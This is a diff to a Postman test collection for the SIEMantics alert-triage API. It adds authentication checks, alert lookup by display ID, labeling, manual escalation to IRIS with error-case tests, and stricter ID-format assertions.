@@ -2,7 +2,7 @@
   "info": {
     "_postman_id": "c9335f53-1139-4cdf-9a87-bd9fcc478129",
     "name": "SIEMantics - Test Scenarios",
-    "description": "Manual/automated test scenarios for the SIEMantics SOAR API. Mirrors scripts/test_requests.sh: covers the mock-engine severity threshold, all 9 suspicious-pattern regexes, IoC extraction, edge cases, labeling and metrics.\n\nRun order matters: folders 1-3 create the alert records that folder 4 labels. Use Collection Runner to execute the whole collection top to bottom, or run folder by folder.\n\nSet the `base_url` and `webhook_token` collection variables (Variables tab) to match your deployment. If WAZUH_WEBHOOK_TOKEN isn't set server-side, `webhook_token` can be left empty.\n\nFolders 4-5 need a logged-in dashboard user: set `ui_username` / `ui_password` - the Login request at the start of folder 4 stores the session cookie in Postman's cookie jar.\n\nFolder 6 holds realistic alerts in the full Wazuh format from several sources (Linux, web, FIM, vulnerability detector, ClamAV, Suricata, Windows/Sysmon, FortiGate, AWS, Office 365). It is independent of folders 1-5; the expected ground truth is in each request name (-> TP / -> FP).",
+    "description": "Manual/automated test scenarios for the SIEMantics SOAR API. Mirrors scripts/test_requests.sh: covers the mock-engine severity threshold, all 9 suspicious-pattern regexes, IoC extraction, edge cases, labeling and metrics, plus the IRIS case content, users, case assignment and auth.\n\nRun order matters: folders 1-3 create the alert records that folder 4 refers to. Use Collection Runner to execute the whole collection top to bottom, or run folder by folder.\n\nSet the `base_url` and `webhook_token` collection variables (Variables tab) to match your deployment. If WAZUH_WEBHOOK_TOKEN isn't set server-side, `webhook_token` can be left empty.\n\nAlert IDs: every stored alert gets a unique `ID-<number>`. A collection-level test checks this format on every alert response and saves it as `ref_<wazuh alert id>` (non-alphanumerics -> `_`, e.g. `ref_test_sqli_union`), so later requests can refer to the exact record.\n\nFolders 4-5 and 7-9 need a logged-in dashboard user (admin): set `ui_username` / `ui_password` - the Login request at the start of folders 4, 7, 8 and 9 stores the session cookie in Postman's cookie jar.\n\nFolder 6 holds realistic alerts in the full Wazuh format from several sources. Folder 7 creates IRIS cases that exercise every part of the case content (see its description for what to check in IRIS). Folder 8 tests the correlation of similar alerts from the same source IP into one case. Folder 9 covers users, case assignment and the analyst/admin permission rules; it ends by logging out.\n\nTrue-positive requests accept both 202 (escalated) and 502 (IRIS unreachable), so the collection also runs without an IRIS instance.",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "variable": [
@@ -24,6 +24,11 @@
     {
       "key": "ui_password",
       "value": "",
+      "type": "string"
+    },
+    {
+      "key": "analyst_password",
+      "value": "Postman-Analyst-1!",
       "type": "string"
     }
   ],
@@ -58,6 +63,53 @@
                   "pm.test('status field is ok', () => {",
                   "  pm.expect(pm.response.json().status).to.eql('ok');",
                   "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Wrong password -> 401",
+          "id": "5cb9e4dc-aa0d-48a8-b19e-c948444b9ed2",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{ui_username}}\",\n  \"password\": \"definitely-not-the-password\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 401', () => pm.response.to.have.status(401));"
                 ]
               }
             }
@@ -122,8 +174,8 @@
                   "  pm.expect(json.triage.is_true_positive).to.eql(false);",
                   "  pm.expect(json.triage.engine).to.eql('mock');",
                   "});",
-                  "pm.test('has a unique #ID-<n> display id', () => {",
-                  "  pm.expect(pm.response.json().id).to.match(/^#ID-\\d+$/);",
+                  "pm.test('has a unique ID-<n> display id', () => {",
+                  "  pm.expect(pm.response.json().id).to.match(/^ID-\\d+$/);",
                   "});"
                 ]
               }
@@ -1216,11 +1268,11 @@
     },
     {
       "name": "4. Alert management",
-      "description": "Run folders 1-3 first so these alert_ids exist. Labeling builds the evaluation dataset for GET /metrics.",
+      "description": "Run folders 1-3 first: their alerts are referred to by the saved `ref_<alert id>` display IDs (ID-<n>). Covers lookup by ID-<n>, by legacy #ID-<n> and by Wazuh alert_id, labeling, manual escalation and the error cases.",
       "item": [
         {
           "name": "Login (dashboard user)",
-          "id": "0b6f4c1e-8d2a-4f53-9a57-3c1f4e2d7a90",
+          "id": "3767ff50-9e3a-4971-af83-90aef2421a5c",
           "request": {
             "method": "POST",
             "header": [
@@ -1229,10 +1281,6 @@
                 "value": "application/json"
               }
             ],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"username\": \"{{ui_username}}\",\n  \"password\": \"{{ui_password}}\"\n}"
-            },
             "url": {
               "raw": "{{base_url}}/api/v1/auth/login",
               "host": [
@@ -1245,7 +1293,16 @@
                 "login"
               ]
             },
-            "description": "Sets the siemantics_session cookie used by the rest of folders 4-5."
+            "description": "Sets the siemantics_session cookie used by the rest of the folder.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{ui_username}}\",\n  \"password\": \"{{ui_password}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
           },
           "event": [
             {
@@ -1254,7 +1311,81 @@
                 "type": "text/javascript",
                 "exec": [
                   "pm.test('status is 200', () => pm.response.to.have.status(200));",
-                  "pm.test('session cookie set', () => pm.expect(pm.cookies.has('siemantics_session')).to.be.true);"
+                  "pm.test('session cookie set', () => pm.expect(pm.cookies.has('siemantics_session')).to.be.true);",
+                  "pm.collectionVariables.set('me_id', pm.response.json().id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Current user (/auth/me)",
+          "id": "b5b8d9b5-97b9-475e-b188-cd59d0445091",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/me",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "me"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('logged in as ui_username', () => {",
+                  "  pm.expect(pm.response.json().username).to.eql(pm.collectionVariables.get('ui_username'));",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Public config (IRIS URL)",
+          "id": "d4e0f94d-d34b-4750-9863-d7d6c6ba98cc",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/config",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "config"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('iris_base_url without trailing slash', () => {",
+                  "  const u = pm.response.json().iris_base_url;",
+                  "  pm.expect(u).to.be.a('string');",
+                  "  pm.expect(u.endsWith('/')).to.be.false;",
+                  "});"
                 ]
               }
             }
@@ -1263,7 +1394,7 @@
         },
         {
           "name": "List alerts",
-          "id": "7f9cf086-e560-4a49-9778-244729eb39f1",
+          "id": "5ec61178-d4e9-4b4f-9ddb-f77ca8fe30fc",
           "request": {
             "method": "GET",
             "header": [],
@@ -1293,7 +1424,12 @@
                 "type": "text/javascript",
                 "exec": [
                   "pm.test('status is 200', () => pm.response.to.have.status(200));",
-                  "pm.test('response is an array', () => pm.expect(pm.response.json()).to.be.an('array'));"
+                  "const list = pm.response.json();",
+                  "pm.test('response is an array', () => pm.expect(list).to.be.an('array'));",
+                  "pm.test('display IDs are unique', () => {",
+                  "  const ids = list.map((r) => r.display_id);",
+                  "  pm.expect(new Set(ids).size).to.eql(ids.length);",
+                  "});"
                 ]
               }
             }
@@ -1301,27 +1437,13 @@
           "response": []
         },
         {
-          "name": "Label test-sqli-union as true_positive",
-          "id": "76493748-e550-4a8a-9528-0d1fc88374fe",
+          "name": "Get alert by display ID (ID-<n>)",
+          "id": "041de97a-19f7-4b3f-bad7-1c127cc40ea8",
           "request": {
-            "method": "PATCH",
-            "header": [
-              {
-                "key": "Content-Type",
-                "value": "application/json"
-              }
-            ],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"ground_truth\": \"true_positive\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
+            "method": "GET",
+            "header": [],
             "url": {
-              "raw": "{{base_url}}/api/v1/alerts/test-sqli-union/label",
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_test_sqli_union}}",
               "host": [
                 "{{base_url}}"
               ],
@@ -1329,8 +1451,113 @@
                 "api",
                 "v1",
                 "alerts",
-                "test-sqli-union",
-                "label"
+                "{{ref_test_sqli_union}}"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Ha a hivatkozas hianyzik (elozo mappa nem futott), a kerest atugorjuk.",
+                  "const ref = pm.collectionVariables.get('ref_test_sqli_union');",
+                  "if (!ref) {",
+                  "  console.warn('ref_test_sqli_union is not set - run folders 1-3 first');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "const json = pm.response.json();",
+                  "pm.test('exactly the referenced record', () => {",
+                  "  pm.expect(json.display_id).to.eql(pm.collectionVariables.get('ref_test_sqli_union'));",
+                  "  pm.expect(json.alert_id).to.eql('test-sqli-union');",
+                  "});",
+                  "pm.test('triage result stored', () => {",
+                  "  pm.expect(json.triage_engine).to.be.a('string');",
+                  "  pm.expect(json.llm_confidence).to.be.within(0, 1);",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Get alert by legacy #ID-<n> (URL-encoded %23) -> same record",
+          "id": "04811da2-65ab-4765-98fe-0555e32c2ddf",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/%23{{ref_test_sqli_union}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "%23{{ref_test_sqli_union}}"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Ha a hivatkozas hianyzik (elozo mappa nem futott), a kerest atugorjuk.",
+                  "const ref = pm.collectionVariables.get('ref_test_sqli_union');",
+                  "if (!ref) {",
+                  "  console.warn('ref_test_sqli_union is not set - run folders 1-3 first');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('same record as ID-<n>', () => {",
+                  "  pm.expect(pm.response.json().display_id).to.eql(pm.collectionVariables.get('ref_test_sqli_union'));",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Get alert by Wazuh alert_id -> latest record",
+          "id": "1ab25001-fedf-4ccd-ab9b-0a2b0cfd83f8",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/test-sqli-union",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "test-sqli-union"
               ]
             },
             "description": ""
@@ -1341,14 +1568,8 @@
               "script": {
                 "type": "text/javascript",
                 "exec": [
-                  "pm.test('status is 200 or 404 (run folder 2 first)', () => {",
-                  "  pm.expect([200, 404]).to.include(pm.response.code);",
-                  "});",
-                  "if (pm.response.code === 200) {",
-                  "  pm.test('ground_truth set', () => {",
-                  "    pm.expect(pm.response.json().ground_truth).to.eql('true_positive');",
-                  "  });",
-                  "}"
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('Wazuh alert_id matches', () => pm.expect(pm.response.json().alert_id).to.eql('test-sqli-union'));"
                 ]
               }
             }
@@ -1356,8 +1577,41 @@
           "response": []
         },
         {
-          "name": "Label test-low-benign as false_positive",
-          "id": "152565c5-6c5f-428b-9ffb-b42521b232b7",
+          "name": "Get unknown display ID -> 404",
+          "id": "9d799e1c-20da-4128-aabe-c3956ae88296",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/ID-999999999",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "ID-999999999"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 404', () => pm.response.to.have.status(404));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Label by display ID: test-sqli-union as true_positive",
+          "id": "ce9b3490-33c7-4ec6-b749-6773b29eae30",
           "request": {
             "method": "PATCH",
             "header": [
@@ -1366,15 +1620,73 @@
                 "value": "application/json"
               }
             ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_test_sqli_union}}/label",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{ref_test_sqli_union}}",
+                "label"
+              ]
+            },
+            "description": "",
             "body": {
               "mode": "raw",
-              "raw": "{\n  \"ground_truth\": \"false_positive\"\n}",
+              "raw": "{\n  \"ground_truth\": \"true_positive\"\n}",
               "options": {
                 "raw": {
                   "language": "json"
                 }
               }
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Ha a hivatkozas hianyzik (elozo mappa nem futott), a kerest atugorjuk.",
+                  "const ref = pm.collectionVariables.get('ref_test_sqli_union');",
+                  "if (!ref) {",
+                  "  console.warn('ref_test_sqli_union is not set - run folders 1-3 first');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
             },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('ground_truth set', () => {",
+                  "  const json = pm.response.json();",
+                  "  pm.expect(json.ground_truth).to.eql('true_positive');",
+                  "  pm.expect(json.labeled_at).to.be.a('string');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Label by Wazuh alert_id: test-low-benign as false_positive",
+          "id": "ec68ba44-1eaa-4770-94fc-5ba5933210fe",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
             "url": {
               "raw": "{{base_url}}/api/v1/alerts/test-low-benign/label",
               "host": [
@@ -1388,7 +1700,16 @@
                 "label"
               ]
             },
-            "description": ""
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ground_truth\": \"false_positive\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
           },
           "event": [
             {
@@ -1400,8 +1721,132 @@
                   "  pm.expect([200, 404]).to.include(pm.response.code);",
                   "});",
                   "if (pm.response.code === 200) {",
-                  "  pm.test('ground_truth set', () => {",
-                  "    pm.expect(pm.response.json().ground_truth).to.eql('false_positive');",
+                  "  pm.test('ground_truth set', () => pm.expect(pm.response.json().ground_truth).to.eql('false_positive'));",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Label with invalid ground_truth -> 422",
+          "id": "2765e695-0d0a-4e66-8125-697676acfad4",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_test_low_benign}}/label",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{ref_test_low_benign}}",
+                "label"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ground_truth\": \"maybe\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Ha a hivatkozas hianyzik (elozo mappa nem futott), a kerest atugorjuk.",
+                  "const ref = pm.collectionVariables.get('ref_test_low_benign');",
+                  "if (!ref) {",
+                  "  console.warn('ref_test_low_benign is not set - run folders 1-3 first');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 422', () => pm.response.to.have.status(422));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Escalate test-below-threshold (needs_review) manually by display ID",
+          "id": "d4c66037-9d9e-4fd2-8aa7-77c887d56ccd",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_test_below_threshold}}/escalate",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{ref_test_below_threshold}}",
+                "escalate"
+              ]
+            },
+            "description": "IRIS: the case name must contain the display ID, the description must say 'Manually escalated by <user>', and the case must carry the 'manual-escalation' tag."
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Ha a hivatkozas hianyzik (elozo mappa nem futott), a kerest atugorjuk.",
+                  "const ref = pm.collectionVariables.get('ref_test_below_threshold');",
+                  "if (!ref) {",
+                  "  console.warn('ref_test_below_threshold is not set - run folders 1-3 first');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200, or 502 if IRIS is unreachable', () => pm.expect([200, 502]).to.include(pm.response.code));",
+                  "if (pm.response.code === 200) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('escalated by the analyst, automatic decision kept', () => {",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.auto_status).to.eql('needs_review');",
+                  "    pm.expect(json.iris_case_id).to.be.a('number');",
+                  "    pm.expect(json.ground_truth).to.eql('true_positive');",
+                  "    pm.expect(json.escalated_by.username).to.eql(pm.collectionVariables.get('ui_username'));",
+                  "    pm.expect(json.escalated_at).to.be.a('string');",
+                  "  });",
+                  "  pm.collectionVariables.set('case_manual', json.iris_case_id);",
+                  "} else {",
+                  "  pm.test('IRIS unavailable as expected (not a bug)', () => {",
+                  "    pm.expect(pm.response.json().detail).to.include('incident management backend unavailable');",
                   "  });",
                   "}"
                 ]
@@ -1411,18 +1856,13 @@
           "response": []
         },
         {
-          "name": "Escalate test-below-threshold (needs_review) manually",
-          "id": "8eec5e85-0f4a-4c25-8ae8-86a7b2dd337f",
+          "name": "Escalate it again -> 409",
+          "id": "08f4b753-7e30-4f3c-a73b-31c790f7d38a",
           "request": {
             "method": "POST",
-            "header": [
-              {
-                "key": "Content-Type",
-                "value": "application/json"
-              }
-            ],
+            "header": [],
             "url": {
-              "raw": "{{base_url}}/api/v1/alerts/test-below-threshold/escalate",
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_test_below_threshold}}/escalate",
               "host": [
                 "{{base_url}}"
               ],
@@ -1430,7 +1870,7 @@
                 "api",
                 "v1",
                 "alerts",
-                "test-below-threshold",
+                "{{ref_test_below_threshold}}",
                 "escalate"
               ]
             },
@@ -1438,51 +1878,18 @@
           },
           "event": [
             {
-              "listen": "test",
+              "listen": "prerequest",
               "script": {
                 "type": "text/javascript",
                 "exec": [
-                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
-                  "pm.test('escalated by the analyst, automatic decision kept', () => {",
-                  "  const json = pm.response.json();",
-                  "  pm.expect(json.status).to.eql('escalated');",
-                  "  pm.expect(json.auto_status).to.eql('needs_review');",
-                  "  pm.expect(json.iris_case_id).to.be.a('number');",
-                  "  pm.expect(json.ground_truth).to.eql('true_positive');",
-                  "});"
+                  "// Csak akkor van ertelme, ha az elozo eszkalacio sikerult.",
+                  "if (!pm.collectionVariables.get('case_manual')) {",
+                  "  console.warn('previous escalation did not create a case (IRIS unreachable?) - skipping');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
                 ]
               }
-            }
-          ],
-          "response": []
-        },
-        {
-          "name": "Escalate it again -> 409",
-          "id": "de555f8b-8dfd-4640-a607-59995090b2ce",
-          "request": {
-            "method": "POST",
-            "header": [
-              {
-                "key": "Content-Type",
-                "value": "application/json"
-              }
-            ],
-            "url": {
-              "raw": "{{base_url}}/api/v1/alerts/test-below-threshold/escalate",
-              "host": [
-                "{{base_url}}"
-              ],
-              "path": [
-                "api",
-                "v1",
-                "alerts",
-                "test-below-threshold",
-                "escalate"
-              ]
             },
-            "description": ""
-          },
-          "event": [
             {
               "listen": "test",
               "script": {
@@ -1496,8 +1903,42 @@
           "response": []
         },
         {
+          "name": "Escalate unknown display ID -> 404",
+          "id": "dccfc552-a533-4bc5-8915-61e345754ce7",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/ID-999999999/escalate",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "ID-999999999",
+                "escalate"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 404', () => pm.response.to.have.status(404));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
           "name": "Label unknown alert -> 404",
-          "id": "cf782845-6904-47ae-a10d-b9ba06ac510d",
+          "id": "69d99b8b-d74a-44a5-9fe8-86429f4c2e46",
           "request": {
             "method": "PATCH",
             "header": [
@@ -1506,15 +1947,6 @@
                 "value": "application/json"
               }
             ],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n  \"ground_truth\": \"true_positive\"\n}",
-              "options": {
-                "raw": {
-                  "language": "json"
-                }
-              }
-            },
             "url": {
               "raw": "{{base_url}}/api/v1/alerts/does-not-exist/label",
               "host": [
@@ -1528,7 +1960,16 @@
                 "label"
               ]
             },
-            "description": ""
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ground_truth\": \"true_positive\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
           },
           "event": [
             {
@@ -1574,9 +2015,12 @@
                 "type": "text/javascript",
                 "exec": [
                   "pm.test('status is 200', () => pm.response.to.have.status(200));",
-                  "pm.test('sample_size is a number', () => {",
-                  "  pm.expect(pm.response.json().sample_size).to.be.a('number');",
-                  "});"
+                  "const m = pm.response.json();",
+                  "pm.test('counters are numbers', () => {",
+                  "  ['sample_size', 'labeled_size', 'error_count', 'needs_review_count', 'needs_review_true_positive',",
+                  "   'manually_escalated_count'].forEach((k) => pm.expect(m[k], k).to.be.a('number'));",
+                  "});",
+                  "pm.test('labeled_size <= sample_size', () => pm.expect(m.labeled_size).to.be.at.most(m.sample_size));"
                 ]
               }
             }
@@ -1640,7 +2084,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -1706,7 +2150,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -1772,7 +2216,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -1838,7 +2282,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -1904,7 +2348,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -1970,7 +2414,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2036,7 +2480,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2102,7 +2546,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2168,7 +2612,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2234,7 +2678,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2300,7 +2744,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2366,7 +2810,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2432,7 +2876,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
